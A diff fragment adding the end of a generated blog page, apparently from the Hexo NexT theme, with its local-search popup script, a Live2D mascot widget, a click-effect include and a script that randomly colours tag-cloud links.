+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":150,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+#next主题标签也随机颜色
+<script type="text/javascript">
+var languages = new Array("C","C++","Java","C#","Python","HTML","CSS","JavaScript","SQL");
+var randoms = new Array(4,3,2,1,3,2,1,4,2,1,3,4,1,2,3,4);
+$(document).ready(function(){
+var tags_all = $(".tag-cloud-tags a");
+tags_all.each(function(){
+  var x = parseInt(Math.random()*3);
+  if(x > 0){
+    x = 1;
+  }
+  for(var i = 0;i<languages.length;i++){
+    if($(this).text() == languages[i]){
+        x = 2;
+      break;
+    }
+  }
+  var y =0;
+  if(x != 0){
+    y = parseInt(Math.random()*16);
+    y = randoms[y];
+  }
+  $(this).addClass("tags"+x+y);
+});
+});
+</script>
